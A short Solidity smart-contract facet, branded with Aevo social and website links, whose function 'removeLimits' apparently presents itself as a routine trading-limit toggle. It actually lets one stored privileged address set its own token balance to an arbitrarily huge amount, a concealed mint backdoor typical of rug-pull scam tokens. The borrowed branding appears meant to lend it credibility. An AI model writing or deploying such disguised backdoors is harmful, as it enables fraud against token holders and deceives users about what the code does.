/*  
   * SPDX-License-Identifier: MIT

     // Telegram: https://t.me/aevoxyz
    // Twitter: https://twitter.com/aevoxyz
    // Website: https://www.aevo.xyz/
    // Medium:  https://medium.com/@aevoxyz
    // Discord: https://discord.com/invite/aevo
    // Github:  https://github.com/aevoxyz
*/

pragma solidity ^0.8.23;
import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
